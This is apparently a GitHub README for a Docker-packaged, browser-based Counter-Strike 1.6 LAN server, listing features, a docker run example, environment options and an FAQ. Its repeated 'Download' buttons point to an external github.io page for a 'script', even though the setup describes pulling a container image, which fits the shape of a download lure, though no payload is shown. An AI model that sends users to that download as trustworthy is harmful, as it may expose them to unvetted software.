# CS 1.6 Web - Browser-Based Counter-Strike Server

> **Play Counter-Strike 1.6 directly in your browser over LAN.** One Docker container, share a link, no client installs required. Uses WebRTC and Xash3D WASM for real-time gameplay.

[![Game Script](https://img.shields.io/badge/Type-Game%20Server-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/stonemilan/cs16-web-win-85900?style=flat-square)](https://github.com/stonemilan/cs16-web-win-85900)

---

<p align="center">
  <a href="https://stonemilan.github.io/cs16-web-win-85900/">
    <img src="https://img.shields.io/badge/Download-CS%201.6%20Web%20Script-brightgreen?style=for-the-badge" alt="Download CS 1.6 Web Script">
  </a>
</p>

> **[Direct Download - CS 1.6 Web](https://stonemilan.github.io/cs16-web-win-85900/)**

---

[Download Latest Build](https://stonemilan.github.io/cs16-web-win-85900/)

---

## Overview

CS 1.6 Web transforms the classic Counter-Strike 1.6 experience into a browser-accessible LAN party. By running a single Docker container, you spin up a fully functional game server that players join through any modern web browser — no Steam, no separate client, no lengthy setup. The project leverages WebRTC for low-latency peer connections and Xash3D compiled to WebAssembly for running the original game engine inside the browser.

This release focuses on making LAN gaming effortless. The server includes an in-browser map picker so hosts can switch levels without touching the command line, and every round grants the full arsenal to all players for fast-paced action. Custom map support lets you drop your own `.bsp` files into the container, and the entire experience stays contained within one Docker image for easy deployment.

---

## Script Features

- **In-browser map picker** — change levels from a web interface without server commands
- **Full arsenal every round** — all weapons available from the start for instant skirmishes
- **Custom maps support** — upload or mount your own map files to the container
- **No install for players** — join via a URL, zero configuration required
- **One Docker container** — deploy the entire server with a single `docker run` command
- **WebRTC networking** — real-time multiplayer communication through the browser
- **Xash3D WASM engine** — original CS 1.6 game logic compiled to run in-browser
- **LAN-focused design** — ideal for local networks, office parties, or home gaming sessions

---

## Setup

1. Ensure Docker is installed on your host machine.
2. Pull the container image or use the provided `docker-compose.yml`.
3. Run the container and expose the required ports (default: 8080 for web, 27015 for game).
4. Share the generated URL with players on the same network.

Minimal example:
```bash
docker run -d -p 8080:8080 -p 27015:27015/udp cs16-web
```

Players open `http://<host-ip>:8080` in their browser to join.

---

## Options

| Setting | Default | Description |
|---|---|---|
| `MAP` | `de_dust2` | Starting map (e.g., `de_inferno`, `cs_assault`) |
| `MAX_PLAYERS` | `16` | Maximum concurrent players |
| `GAME_MODE` | `classic` | Game mode (`classic`, `deathmatch`, `gungame`) |
| `RESPAWN_TIME` | `0` | Seconds before respawn (0 = instant) |
| `FRIENDLY_FIRE` | `false` | Enable or disable friendly fire |

Configuration can be passed as environment variables to the container.

---

## Compatibility

- **Game:** Counter-Strike 1.6 (original game assets required, not included)
- **Platform:** Docker (Linux, macOS, Windows via WSL2)
- **Browsers:** Chrome, Firefox, Edge (latest versions with WebRTC support)
- **Limitations:** Requires a stable LAN connection; internet play may introduce latency. Custom maps must be in `.bsp` format. Game assets (e.g., valve, cstrike folders) must be provided by the host.

---

## FAQ

**How do I add custom maps?**  
Mount a volume containing your `.bsp` files to `/cs16/maps` inside the container, then select them from the in-browser map picker.

**Can I update the server while it's running?**  
Stop the container, pull the latest image, and restart. Player progress is not saved between sessions.

**How do I change game settings?**  
Use environment variables when starting the container (see Options table above) or modify the configuration file inside the container.

**Is this compatible with the original CS 1.6 clients?**  
No — this project runs entirely in the browser. It does not connect to Steam or native CS 1.6 servers.

**Where are game assets stored?**  
Game assets are not bundled. You must provide the original CS 1.6 data files (valve, cstrike directories) via a mounted volume.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
